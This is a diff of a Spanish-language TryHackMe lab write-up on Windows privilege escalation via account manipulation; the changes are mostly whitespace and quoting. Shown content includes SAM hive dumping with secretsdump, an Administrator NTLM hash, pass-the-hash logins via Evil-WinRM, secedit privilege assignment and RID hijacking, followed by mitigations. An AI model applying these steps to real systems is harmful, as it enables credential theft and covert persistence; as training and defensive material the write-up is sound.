@@ -11,7 +11,6 @@ year: "2026"
 status: "pwned"
 tags:
   - "PrivEsc"
-  - "Windows"
   - "UserManipulation"
   - "Remote"
 techniques:
@@ -35,7 +34,6 @@ flags_list:
     value: "Password321"
 summary: "Laboratorio de TryHackMe sobre escalada de privilegios en Windows manipulando cuentas de usuario sin privilegios. Se cubren tres métodos principales: (1) agregar usuario a grupo Backup Operators y dumpear SAM, (2) asignar privilegios especiales SeBackup/SeRestore mediante secedit, (3) hijackear RID en registry para clonar privilegios de Administrator. Objetivo final: obtener acceso como Administrator usando Pass-the-Hash.  ---"
 steps:
-
   - id: "exploit_1"
     num: "01"
     title: "Objetivo"
@@ -104,21 +102,21 @@ steps:
           Country/region code          000 (System Default)
           Account active               Yes
           Account expires              Never
-          
+
           Password last set            5/28/2022 11:48:27 PM
           Password expires             Never
           Password changeable          5/28/2022 11:48:27 PM
           Password required            Yes
           User may change password     No
-          
+
           Workstations allowed         All
           Logon script
           User profile
           Home directory
           Last logon                   Never
-          
+
           Logon hours allowed          All
-          
+
           Local Group Memberships      *Administrators       *Users
           Global Group memberships     *None
           The command completed successfully.
@@ -135,21 +133,21 @@ steps:
           Country/region code          000 (System Default)
           Account active               Yes
           Account expires              Never
-          
+
           Password last set            5/28/2022 11:47:16 PM
           Password expires             Never
           Password changeable          5/28/2022 11:47:16 PM
           Password required            Yes
           User may change password     No
-          
+
           Workstations allowed         All
           Logon script
           User profile
           Home directory
           Last logon                   Never
-          
+
           Logon hours allowed          All
-          
+
           Local Group Memberships      *Backup Operators     *Remote Management Use
                                        *Users
           Global Group memberships     *None
@@ -196,10 +194,10 @@ steps:
         lang: "BASH"
         code: |
           whoami /groups
-          
+
           GROUP INFORMATION
           -----------------
-          
+
           Group Name                             Type             SID          Attributes
           ====================================== ================ ============ ==================================================
           Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
@@ -243,10 +241,10 @@ steps:
                                                   
           Info: Establishing connection to remote endpoint
           *Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
-          
+
           GROUP INFORMATION
           -----------------
-          
+
           Group Name                           Type             SID          Attributes
           ==================================== ================ ============ ==================================================
           Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
@@ -286,11 +284,11 @@ steps:
         lang: "CMD"
         code: |
           PS C:\Users\thmuser1\Documents> dir
-          
-          
+
+
               Directory: C:\Users\thmuser1\Documents
-          
-          
+
+
           Mode                LastWriteTime         Length Name
           ----                -------------         ------ ----
           -a----        4/23/2026   2:58 PM          61440 sam.bak
@@ -315,7 +313,7 @@ steps:
         code: |
           python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL 
           Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
-          
+
           [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
           [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
           Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
@@ -344,8 +342,8 @@ steps:
           Info: Establishing connection to remote endpoint
           *Evil-WinRM* PS C:\Users\Administrator\Documents> WHOAMI
           wpersistence\administrator
-          
-          
+
+
           *Evil-WinRM* PS C:\Users\Administrator\Documents>
       - kind: "note"
         text: |
@@ -400,14 +398,14 @@ steps:
         lang: "CMD"
         code: |
           C:\Users\Administrator\Desktop>notepad config.inf
-          
+
           C:\Users\Administrator\Desktop>secedit /import /cfg config.inf /db config.sdb
-          
+
           C:\Users\Administrator\Desktop>secedit /configure /db config.sdb /cfg config.inf
-          
+
           The task has completed successfully.
           See log %windir%\security\logs\scesrv.log for detail info.
-          
+
           C:\Users\Administrator\Desktop>
       - kind: "note"
         text: |
@@ -442,21 +440,21 @@ steps:
           Country/region code          000 (System Default)
           Account active               Yes
           Account expires              Never
-          
+
           Password last set            5/28/2022 11:47:16 PM
           Password expires             Never
           Password changeable          5/28/2022 11:47:16 PM
           Password required            Yes
           User may change password     No
-          
+
           Workstations allowed         All
           Logon script
           User profile
           Home directory
           Last logon                   4/23/2026 3:17:07 PM
-          
+
           Logon hours allowed          All
-          
+
           Local Group Memberships      *Backup Operators     *Remote Management Use
                                        *Users
           Global Group memberships     *None
@@ -501,7 +499,7 @@ steps:
         lang: "CMD"
         code: |
           C:\> wmic useraccount get name,sid
-          
+
           Name                SID
           Administrator       S-1-5-21-1966530601-3185510712-10604624-500
           DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
@@ -542,22 +540,22 @@ steps:
         text: "RID Hijacking es la técnica más sigilosa. El usuario sigue siendo miembro de los mismos grupos, no hay cambios visibles en `net user`, y sin embargo tiene privilegios administrativos completos porque el sistema operativo lee su RID del registro. LSASS usa ese RID para crear el token, y si RID = 500, tiene privilegios de Administrator."
 
 lessons:
-  - 'Los grupos especiales (Backup Operators) tienen privilegios muy poderosos por defecto'
-  - 'LocalAccountTokenFilterPolicy puede limitar efectivamente el acceso remoto incluso para administradores'
-  - 'Pass-the-Hash es efectivo porque NTLM no requiere la contraseña original'
-  - 'secedit permite asignar privilegios sin cambiar membresía de grupos (más discreto)'
-  - 'RID Hijacking es casi invisible - el usuario sigue pareciendo normal en auditorías básicas'
-  - 'El registro SAM es el objetivo crítico en Windows - quien accede a SAM, accede a todo'
-  - 'Múltiples capas de defensa (grupos + privilegios + RID) son necesarias para prevenir escalada'
+  - "Los grupos especiales (Backup Operators) tienen privilegios muy poderosos por defecto"
+  - "LocalAccountTokenFilterPolicy puede limitar efectivamente el acceso remoto incluso para administradores"
+  - "Pass-the-Hash es efectivo porque NTLM no requiere la contraseña original"
+  - "secedit permite asignar privilegios sin cambiar membresía de grupos (más discreto)"
+  - "RID Hijacking es casi invisible - el usuario sigue pareciendo normal en auditorías básicas"
+  - "El registro SAM es el objetivo crítico en Windows - quien accede a SAM, accede a todo"
+  - "Múltiples capas de defensa (grupos + privilegios + RID) son necesarias para prevenir escalada"
 mitigation:
-  - 'Proteger registry SAM usando permisos NTFS restrictivos (aunque Backup Operators los ignora)'
-  - 'Auditar cambios en LocalAccountTokenFilterPolicy'
-  - 'Monitorear cambios en registry SAM especialmente en posición 0x30 (RID)'
-  - 'Auditar asignación de SeBackup/SeRestore mediante secedit y security descriptors'
-  - 'Implementar Device Guard/Code Integrity para prevenir ejecución de Regedit no autorizado'
-  - 'Usar Credential Guard para proteger NTLM hashes'
-  - 'Auditar pertenencia en grupos privilegiados regularmente'
-  - 'Implementar MFA para acceso administrativo'
-  - 'Usar logs de seguridad para detectar actividad de Backup Operators'
-  - 'Considerar deshabilitar WinRM si no es necesario'
+  - "Proteger registry SAM usando permisos NTFS restrictivos (aunque Backup Operators los ignora)"
+  - "Auditar cambios en LocalAccountTokenFilterPolicy"
+  - "Monitorear cambios en registry SAM especialmente en posición 0x30 (RID)"
+  - "Auditar asignación de SeBackup/SeRestore mediante secedit y security descriptors"
+  - "Implementar Device Guard/Code Integrity para prevenir ejecución de Regedit no autorizado"
+  - "Usar Credential Guard para proteger NTLM hashes"
+  - "Auditar pertenencia en grupos privilegiados regularmente"
+  - "Implementar MFA para acceso administrativo"
+  - "Usar logs de seguridad para detectar actividad de Backup Operators"
+  - "Considerar deshabilitar WinRM si no es necesario"
 ---
